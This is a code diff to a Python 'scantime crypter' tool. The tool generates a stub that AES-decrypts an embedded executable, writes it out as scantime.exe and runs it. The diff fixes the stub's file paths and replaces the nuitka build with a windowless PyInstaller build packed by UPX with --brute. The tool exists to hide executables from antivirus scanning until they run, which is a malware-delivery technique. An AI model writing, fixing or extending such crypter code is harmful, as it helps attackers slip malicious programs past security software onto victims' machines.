@@ -4,6 +4,7 @@ import stat
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
 from colorama import Fore, Style
+import subprocess
 
 
 def generate_random_key(key_size):
@@ -47,19 +48,20 @@ import subprocess
 import os
 
 # Get key and IV from user input
-key = r'{key.hex()}'
+key = '{key.hex()}'
 key = bytes.fromhex(key)
-iv = r'{iv.hex()}'
+iv = '{iv.hex()}'
 iv = bytes.fromhex(iv)
 
 cipher = AES.new(key, AES.MODE_CBC, iv)
 
-input_file = '{output_file}.exe'
+input_file = f'{output_file}.exe'
 output_file = 'scantime.exe'
 
 file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), input_file)
+ofile_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), output_file)
 
-with open(file_path, 'rb') as f_in, open(output_file, 'wb') as f_out:
+with open(file_path, 'rb') as f_in, open(ofile_path, 'wb') as f_out:
     iv = f_in.read(16)  # Read the IV from the input file
     while True:
         encrypted_chunk = f_in.read(32)
@@ -68,11 +70,11 @@ with open(file_path, 'rb') as f_in, open(output_file, 'wb') as f_out:
         decrypted_chunk = cipher.decrypt(encrypted_chunk)
         f_out.write(decrypted_chunk)
 
-subprocess.run('scantime.exe', shell=True)
+subprocess.run(ofile_path, shell=True)
 """)
-        os.system(f'nuitka --onefile --standalone --output-filename=Scantime-crypted --mingw64 --include-data-file={output_file}.exe={output_file}.exe stub.py')
-        print(
-            Fore.BLUE + 'ur good to go ur crypter is '
+        os.system(f'pyinstaller --onefile --noconsole --name "Scantime-crypted" --add-data "{output_file}.exe;." stub.py')
+        subprocess.run(['upx/upx.exe','--brute','dist/Scantime-crypted.exe'])
+        print(Fore.BLUE + 'ur good to go ur crypter is '
                         'ready!!' + Style.RESET_ALL)
 
 
@@ -112,6 +114,7 @@ def display_menu():
     print("3. Quit" + Style.RESET_ALL)
 
 
+# Example usage
 while True:
     display_menu()
     choice = input(Fore.CYAN + "Enter your choice: " + Style.RESET_ALL)
@@ -132,3 +135,4 @@ while True:
         break
     else:
         print(Fore.RED + "Invalid choice. Please try again." + Style.RESET_ALL)
+
